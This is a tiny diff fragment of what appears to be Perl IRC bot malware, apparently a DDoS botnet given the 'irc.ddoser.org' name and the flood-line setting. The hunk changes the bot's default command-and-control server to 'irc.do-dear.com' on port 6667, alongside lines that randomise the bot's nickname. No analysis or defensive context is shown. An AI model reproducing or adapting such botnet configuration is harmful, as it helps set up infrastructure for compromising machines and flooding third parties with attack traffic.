@@ -133,7 +133,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'irc.ddoser.org' unless $server;
+$server = 'irc.do-dear.com' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
